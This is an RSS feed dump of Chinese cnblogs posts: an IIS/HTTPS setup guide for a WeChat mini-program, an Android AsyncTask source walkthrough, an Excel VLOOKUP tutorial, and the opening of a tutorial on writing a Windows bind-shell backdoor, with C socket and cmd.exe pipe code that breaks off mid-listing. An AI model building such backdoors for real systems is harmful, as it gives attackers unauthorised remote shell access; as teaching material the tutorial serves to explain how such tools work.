&lt;p&gt;  仍然提示不在合法域名中，仔细一看，原来小程序要求配&lt;span&gt;置的服务器域名必须是https&lt;/span&gt;的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031105825449-571222868.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;  行，那就去阿里云搞一个证书，登录阿里云管理控制台，列表选择安全（云盾）-》CA证书服务，购买证书&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031110106761-785520115.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;   等几分钟证书就申请好了，点【下载】&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031110210230-594518191.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 本人的是云虚拟主机啊，只是服务器上的一个文件夹而已，根本没办法去配置证书，怎么办，然后去查资料，发现可以通过CDN加速或者上负载均衡来实现&lt;/p&gt;
&lt;p&gt; 如果你觉得上面两种方式能满足你的需求，请另行百度，总之我是放弃了。&lt;/p&gt;
&lt;p&gt; 之后本人就去买了个ECS服务器最低配的那种，选择windows server 2008 R2&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031110955152-2132090609.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;准备拿着公网ip在自己的电脑上远程连接桌面，结果提示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031111153761-1912926434.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 然后就去查安全组配置，发现该有的都有了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031111314933-1625814277.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;后面升级https需要加一条规则&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031134123418-1458372228.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;用网页版的远程连接到服务器上查看是否开启了允许远程连接，是可以的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031111551308-625697151.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;查看防火墙，关了的，讲道理应该能远程上才对。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031111627402-475756489.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 最后发现cmd-》ipconfig发现没有分配Ip地址，于是修改成静态内网Ip,终于远程上了。&lt;span&gt;远程连接不上会有很多种原因，如果按照查询的方法仍然不行的话，建议提交阿里云工单，还是很靠谱的&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt; 安装IIS，这一步没有任何坑&lt;/p&gt;
&lt;p&gt; 安装证书&lt;/p&gt;
&lt;p&gt; 发布代码，添加网站绑定&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031112328777-1323965881.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;添加HTTPS绑定，选择ssl证书&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031112413558-2057524718.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;iis上浏览网站（https）的，发现地址栏是本地，并没有指到我的域名，上面的框里也没有办法修改添加主机名&lt;/p&gt;
&lt;p&gt;iis7下面默认HTTPS绑定是无法指定主机头的，但我们可以通过手工修改IIS配置来实现主机头绑定&lt;/p&gt;
&lt;p&gt; 打开&lt;span&gt;C:\Windows\system32\inetsrv\config\applicationHost.config&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 搜索https&lt;/p&gt;
&lt;p&gt;         &amp;lt;bindings&amp;gt;&lt;br/&gt;                    &lt;span&gt;&amp;lt;binding protocol=&quot;https&quot; bindingInformation=&quot;*:443&quot; /&amp;gt;&lt;br/&gt;&lt;/span&gt;　　　　　　xxxxxxx&lt;/p&gt;
&lt;p&gt;　　　　　　xxxxxx&lt;br/&gt;        &amp;lt;/bindings&amp;gt;&lt;/p&gt;
&lt;p&gt;修改成：&lt;/p&gt;
&lt;p&gt; &amp;lt;binding protocol=&quot;https&quot; bindingInformation=&quot;*:443:你的域名&quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;域名解析中添加服务器ip的解析&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031133927808-1395868622.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;  一切完毕之后，准备开始调用access_token大展身手，结果又提示&lt;span&gt;TLS版本为1.0，至少需要1.2及以上版本&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 经查询发现，在IIS7中TLS1.2协议是默认关闭的。&lt;/p&gt;
&lt;p&gt;所以我们需要对IIS做下设置，来开启TLS1.2协议。&lt;/p&gt;
&lt;p&gt;可使用ssltools工具&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031134627636-2064583613.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 该升级的也升级了&lt;/p&gt;
&lt;p&gt;终于，接口通了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031135023324-1374943415.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;




&lt;h3 id=&quot;wxrequestobject&quot;&gt; &lt;/h3&gt;

</description>
<pubDate>Tue, 31 Oct 2017 05:51:00 +0000</pubDate>
<dc:creator>anyhoo</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/anyhoo/p/7760917.html</dc:identifier>
</item>
<item>
<title>AsyncTask学习 - DOUBLEYOU</title>
<link>http://www.cnblogs.com/doubleyoujs/p/7761116.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/doubleyoujs/p/7761116.html</guid>
<description>&lt;p&gt;在学习Android的时候，开始用到比较多的异步处理的类大概就是AsyncTask,但是我们很多时候只知道调用，却不知道思考一些东西。&lt;/p&gt;
&lt;p&gt;本文就简单的总结和分析了一些AsyncTask的知识。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一、AsyncTask使用&lt;/strong&gt;&lt;br/&gt;直接继承AsyncTask，它一共有3个泛型参数Params, Progress, Result.&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
public abstract class AsyncTask&amp;lt;Params, Progress, Result&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;Params表示AsyncTask执行任务的参数的类型（传入的参数的类型，在doInBackground用到的，使用execute方法中传入)&lt;/li&gt;
&lt;li&gt;Progress表示在后台线程处理的过程中，可以阶段性地发布结果的数据类型（在onProgressUpdate中用到，使用publicProgress中传入）&lt;/li&gt;
&lt;li&gt;Result表示任务全部完成后所返回的数据类型（doInBackground方法的返回值）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt; 必须实现的方法有一个：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
protected abstract Result doInBackground(Params... params);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这个方法是在异步线程中执行的操作，我们主要处理的也是这个方法。&lt;/p&gt;

&lt;p&gt;有3个方法需要熟悉：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#异步执行之前也就是doInBackground之前执行
protected void&lt;span&gt; onPreExecute()
#异步执行之后也就是doInBackground之后执行
protected void&lt;span&gt; onPostExecute(Result result)
#执行过程中执行
protected void onProgressUpdate(Progress... values) &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这3个方法都是在UI线程中，所以可以直接更新UI&lt;/p&gt;

&lt;p&gt;执行的方法有两个：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
public final AsyncTask&amp;lt;Params, Progress, Result&amp;gt; execute(Params... params) {
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;execute方法，每次只能执行一个线程，不支持并发。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
public final AsyncTask&amp;lt;Params, Progress, Result&amp;gt;&lt;span&gt; executeOnExecutor(Executor exec,
            Params... params) {&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;executeOnExecutor添加自己的线程池，那么可以支持并发。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;AsyncTask使用的注意事项&lt;/strong&gt;：&lt;/p&gt;
&lt;ul readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;AsyncTask的实例必须在主线程中创建。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;AsyncTask的execute方法必须在主线程中调用。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;onPreExecute()、onPostExecute(Result),、doInBackground(Params…) 和 onProgressUpdate(Progress…)这四个方法都是回调方法，Android会自动调用，我们不应自己调用。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;对于一个AsyncTack的实例，只能执行一次execute方法，在该实例上第二次执行execute方法时就会抛出异常。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;前两条基本是一个意思，就是使用的AsyncTask时候在UI线程中创建执行。4个主要的方法不能在外部去调用，一个AsyncTask执行一次。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;二、源码分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;AsyncTask主要实现是线程池+handler来实现的。&lt;/p&gt;
&lt;p&gt;线程池：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
    private static final int CPU_COUNT =&lt;span&gt; Runtime.getRuntime().availableProcessors();
    // We want at least 2 threads and at most 4 threads in the core pool,
    // preferring to have 1 less than the CPU count to avoid saturating
    // the CPU with background work
    private static final int CORE_POOL_SIZE = Math.max(2, Math.min(CPU_COUNT - 1, 4&lt;span&gt;));
    private static final int MAXIMUM_POOL_SIZE = CPU_COUNT * 2 + 1&lt;span&gt;;
    private static final int KEEP_ALIVE_SECONDS = 30&lt;span&gt;; 

    /**
     * An {@link Executor} that can be used to execute tasks in parallel.
     */
    public static final&lt;span&gt; Executor THREAD_POOL_EXECUTOR;

    static&lt;span&gt; {
        ThreadPoolExecutor threadPoolExecutor = new&lt;span&gt; ThreadPoolExecutor(
                CORE_POOL_SIZE, MAXIMUM_POOL_SIZE, KEEP_ALIVE_SECONDS, TimeUnit.SECONDS,
                sPoolWorkQueue, sThreadFactory);
        threadPoolExecutor.allowCoreThreadTimeOut(true&lt;span&gt;);
        THREAD_POOL_EXECUTOR =&lt;span&gt; threadPoolExecutor;
    }&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;使用ThreadPoolExecutor创建一个线程池，这线程次的核心线程是动态的，根据cpu的数量来定（2-4）个，在4.4之前是核心线程数是5。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
    private static class SerialExecutor implements&lt;span&gt; Executor {
        final ArrayDeque&amp;lt;Runnable&amp;gt; mTasks = new ArrayDeque&amp;lt;Runnable&amp;gt;&lt;span&gt;();
        Runnable mActive;

        public synchronized void execute(final&lt;span&gt; Runnable r) {
            mTasks.offer(new&lt;span&gt; Runnable() {
                public void&lt;span&gt; run() {
                    try&lt;span&gt; {
                        r.run();
                    } finally&lt;span&gt; {
                        scheduleNext();
                    }
                }
            });
            if (mActive == null&lt;span&gt;) {
                scheduleNext();
            }
        }

        protected synchronized void&lt;span&gt; scheduleNext() {
            if ((mActive = mTasks.poll()) != null&lt;span&gt;) {
                THREAD_POOL_EXECUTOR.execute(mActive);
            }
        }
    }&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;把Runnable放入双端队列末尾，交给线程池去处理。（&lt;strong&gt;java.util.ArrayDeque.offer(E e) &lt;/strong&gt;方法将指定的元素E在此deque队列的末尾。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;java.util.ArrayDeque.poll() &lt;/strong&gt;检索并移除此queue队列表示的队列的头部。返回null如果此queue队列为空。）&lt;/p&gt;
&lt;p&gt;那么具体的线程在哪呢？&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
        mWorker = new WorkerRunnable&amp;lt;Params, Result&amp;gt;&lt;span&gt;() {
            public Result call() throws&lt;span&gt; Exception {
                mTaskInvoked.set(true&lt;span&gt;);
                Result result = null&lt;span&gt;;
                try&lt;span&gt; {
                    Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                    //noinspection unchecked
                    result =&lt;span&gt; doInBackground(mParams);
                    Binder.flushPendingCommands();
                } catch&lt;span&gt; (Throwable tr) {
                    mCancelled.set(true&lt;span&gt;);
                    throw&lt;span&gt; tr;
                } finally&lt;span&gt; {
                    postResult(result);
                }
                return&lt;span&gt; result;
            }
        };

        mFuture = new FutureTask&amp;lt;Result&amp;gt;&lt;span&gt;(mWorker) {
            @Override
            protected void&lt;span&gt; done() {
                try&lt;span&gt; {
                    postResultIfNotInvoked(get());
                } catch&lt;span&gt; (InterruptedException e) {
                    android.util.Log.w(LOG_TAG, e);
                } catch&lt;span&gt; (ExecutionException e) {
                    throw new RuntimeException(&quot;An error occurred while executing doInBackground()&quot;&lt;span&gt;,
                            e.getCause());
                } catch&lt;span&gt; (CancellationException e) {
                    postResultIfNotInvoked(null&lt;span&gt;);
                }
            }
        };&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;主要就是这个FutureTask+Callable实现了异步线程，WorkerRunnable 实现了Callable接口。&lt;/p&gt;
&lt;p&gt;（实现多线程的方式有几种？可能现在需要多记一种Callable）&lt;/p&gt;
&lt;p&gt;主要Handler：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
    private static class InternalHandler extends&lt;span&gt; Handler {
        public&lt;span&gt; InternalHandler(Looper looper) {
            super&lt;span&gt;(looper);
        }

        @SuppressWarnings({&quot;unchecked&quot;, &quot;RawUseOfParameterizedType&quot;&lt;span&gt;})
        @Override
        public void&lt;span&gt; handleMessage(Message msg) {
            AsyncTaskResult&amp;lt;?&amp;gt; result = (AsyncTaskResult&amp;lt;?&amp;gt;&lt;span&gt;) msg.obj;
            switch&lt;span&gt; (msg.what) {
                case&lt;span&gt; MESSAGE_POST_RESULT:
                    // There is only one result
                    result.mTask.finish(result.mData[0&lt;span&gt;]);
                    break&lt;span&gt;;
                case&lt;span&gt; MESSAGE_POST_PROGRESS:
                    result.mTask.onProgressUpdate(result.mData);
                    break&lt;span&gt;;
            }
        }
    }&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在实例化AsyncTask的时候回去准备好线程池、线程和handler，在execute执行的时候把线程扔到线程池中执行，执行中可以发送数据handler（publishProgress）,结束后发消息给handler（postResult）。&lt;/p&gt;
&lt;p&gt;根据源代码可以总结出：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;execute方法会调用executeOnExecutor方法，使用的线程池还是默认的&lt;/li&gt;
&lt;li&gt;executeOnExecutor和execute在UI线程执行，那么里面调用的所有方法也是在UI线程中，所以onPreExecute()方法在UI线程中&lt;/li&gt;
&lt;li&gt;handler使用的是UI线程的looper = Looper.getMainLooper()，那么Handler的handleMessage方法在UI线程中，所以onPostExecute和onProgressUpdate在UI线程中。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;AsyncTask的注意事项基本可以从源码中看出原因，基本的AsyncTask总结就这些，希望一个不一样的自己。&lt;/p&gt;

</description>
<pubDate>Tue, 31 Oct 2017 05:47:00 +0000</pubDate>
<dc:creator>DOUBLEYOU</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/doubleyoujs/p/7761116.html</dc:identifier>
</item>
<item>
<title>Excel 查找某列中的数据在另一列是否存在及输出第三例的数据 - 长安七月</title>
<link>http://www.cnblogs.com/julygift/p/7761050.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/julygift/p/7761050.html</guid>
<description>&lt;p&gt; 最近在操作Excel文件数据导入数据库时，经常需要检查Excel中哪些数据数据库中已经存在，哪些不存在，然后再将不存在数据库中的Excel数据导入；在此过程中，经常需要操作Excel中的数据，所以、也就使用了个别Excel函数，现在介绍各函数如下：&lt;/p&gt;
&lt;p&gt;VLOOKUP函数：&lt;/p&gt;
&lt;p&gt;&lt;span&gt;定义：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;VLOOKUP(lookup_value, table_array,col_index_num, [range_lookup])&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;解释：&lt;/p&gt;
&lt;p&gt;lookup_value: 指的是要查询的某个值。如A2&lt;/p&gt;
&lt;p&gt;table_array: 指的是要查询的列。如H列则写成H:H; 若是H, I,J,K列则写成H:K&lt;/p&gt;
&lt;p&gt;col_index_num: 指的是要查询列的索引，索引值默认从1开始。&lt;/p&gt;
&lt;p&gt;range_lookup: 可选值TRUE/FALSE, 也可用0代替FALSE，TRUE表示模糊查找，但是查找列的第一列数据必须是递增排序的。FALSE表示精确查找。&lt;/p&gt;

&lt;p&gt;案例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/723676/201710/723676-20171031131746121-1923528280.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;如上所示有两张表格，一张联系人表，一张成绩表。&lt;/p&gt;
&lt;p&gt;如果想查出哪些人有成绩可用：=VLOOKUP(A2,G:G,1,FALSE)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/723676/201710/723676-20171031132332168-994706837.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过下拉就可以查出谁有成绩，谁没成绩；但这却不是我们的目的，我们想要的应该是这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/723676/201710/723676-20171031132649699-662711063.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 此时，用的还是VLOOKUP函数，只是我们修改参数如=VLOOKUP(A2,G:H,2,FALSE)&lt;/p&gt;
&lt;p&gt;这时查询列是G,H两列，索引变成了第二列。&lt;/p&gt;
&lt;p&gt;当然这里我们还可以做些优化，这就需要另一个函数IFERROE了&lt;/p&gt;
&lt;p&gt;IFERROR：&lt;br/&gt;定义：&lt;/p&gt;
&lt;p&gt;IFERROR(value, value_if_error)&lt;/p&gt;
&lt;p&gt;value: 指需要判断的值&lt;/p&gt;
&lt;p&gt;value_if_error: 指的是如果上面的value为错误数据时，则返回该值。&lt;/p&gt;
&lt;p&gt;借用上面的例子&lt;/p&gt;
&lt;p&gt;=IFERROR(VLOOKUP(A2,G:H,2,FALSE),&quot;不存在&quot;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/723676/201710/723676-20171031133936965-1928636.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 至此，Excel函数介绍结束。&lt;/p&gt;
</description>
<pubDate>Tue, 31 Oct 2017 05:28:00 +0000</pubDate>
<dc:creator>长安七月</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/julygift/p/7761050.html</dc:identifier>
</item>
<item>
<title>后门编程(1)之双管道主动连接型 - 七夜的故事</title>
<link>http://www.cnblogs.com/qiyeboy/p/7760950.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qiyeboy/p/7760950.html</guid>
<description>&lt;p&gt;&lt;span&gt;　　长时间不写博客就是容易懒，今天10月最后一天，写篇博客来结个尾。今天写的是关于如何编写windows后门程序，主要是涉及的技术是socket通信和管道。后门分为主动连接型和反向连接型，而根据使用的管道数又可以细分为双管道，单管道和零管道。今天讲的是双管道主动连接型后门的编写。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;一.原理讲解　&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　1.1 主动连接型指的是后门程序作为服务端，换句话说被攻击者的服务器作为服务端，攻击者(黑客)作为客户端主动去连接后门程序，执行一系列的shell操作。服务器不一定是放在外网中，其实在内网中也是可以的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/899843/201710/899843-20171031120505730-826447574.jpg&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;从上图中可以看到后门程序需要监听指定端口，并可以接收外部的连接，这就涉及了socket服务端程序的编写，在windows上编写的步骤为：&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;span&gt;初始化socket&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;创建TCP类型的socket&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;绑定指定端口，开始监听并接收连接&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;span&gt;部分代码如下：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;初始化socket&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (!SockInit()) &lt;span&gt;return&lt;/span&gt;&lt;span&gt; FALSE;
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建socket&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt;     SOCKET serverSocket =&lt;span&gt; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (serverSocket == INVALID_SOCKET) &lt;span&gt;return&lt;/span&gt;&lt;span&gt; FALSE;
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;绑定指定端口&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt;     sockaddr_in sServer = { &lt;span&gt;0&lt;/span&gt;&lt;span&gt; };
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     sServer.sin_family =&lt;span&gt; AF_INET;
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     sServer.sin_addr.s_addr =&lt;span&gt; htonl(INADDR_ANY);
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     sServer.sin_port =&lt;span&gt; htons(port);
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (bind(serverSocket,(sockaddr*) &amp;amp;sServer, &lt;span&gt;sizeof&lt;/span&gt;(sServer)) ==&lt;span&gt; SOCKET_ERROR)
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;    {
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; FALSE;
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;开始监听，并且接受连接&lt;/span&gt;
&lt;span&gt;16&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (listen(serverSocket, &lt;span&gt;5&lt;/span&gt;) ==&lt;span&gt; SOCKET_ERROR)
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;    {
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; FALSE;
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt; 
&lt;span&gt;21&lt;/span&gt;     SOCKET cSocket = accept(serverSocket, NULL, NULL);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;　　1.2 后门程序不仅需要接收外部的连接，还需要进行本地的shell操作，这样黑客在自己的电脑上就可以远程操作服务器的shell。这就涉及到进程间通信，采用的是管道技术。下面我把工作流程进行进一步细化，由于管道是单向的，因此这次使用双管道分别进行读操作和写操作。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/899843/201710/899843-20171031122948402-2033703770.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;大家可能奇怪为什么有两个管道，却只有一个socket，因为socket传输是双向的。上图的工作流程是这样的，首先黑客通过网络远程连接到后门程序，后门程序接收到socket传过来的指令，并通过读管道传给cmd.exe进程，进行操作，并把操作的结果通过写管道传给socket,最终传回黑客电脑。后门程序和cmd.exe建立管道通信的代码如下：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;56&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;开始创建管道，管道是单向的，所以创建两个管道，
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;一个负责读一个负责写&lt;/span&gt;
&lt;span&gt; 3&lt;/span&gt;     
&lt;span&gt; 4&lt;/span&gt;     HANDLE hReadPipe1, hWritePipe1;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;管道1 的读写&lt;/span&gt;
&lt;span&gt; 5&lt;/span&gt;     HANDLE hReadPipe2, hWritePipe2;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;管道2的读写&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt;     SECURITY_ATTRIBUTES sa = { &lt;span&gt;0&lt;/span&gt;&lt;span&gt; };
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     sa.nLength = &lt;span&gt;sizeof&lt;/span&gt;&lt;span&gt;(SECURITY_ATTRIBUTES);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     sa.lpSecurityDescriptor =&lt;span&gt; NULL;
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     sa.bInheritHandle =&lt;span&gt; TRUE;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; 
&lt;span&gt;12&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (!CreatePipe(&amp;amp;hReadPipe1, &amp;amp;hWritePipe1, &amp;amp;sa, &lt;span&gt;0&lt;/span&gt;) ||
&lt;span&gt;13&lt;/span&gt;         !CreatePipe(&amp;amp;hReadPipe2, &amp;amp;hWritePipe2, &amp;amp;sa, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; FALSE;
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;启动cmd.exe，并建立与它的管道通信
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;首先配置启动参数&lt;/span&gt;
&lt;span&gt;17&lt;/span&gt;     STARTUPINFO si = {&lt;span&gt;0&lt;/span&gt;&lt;span&gt;};
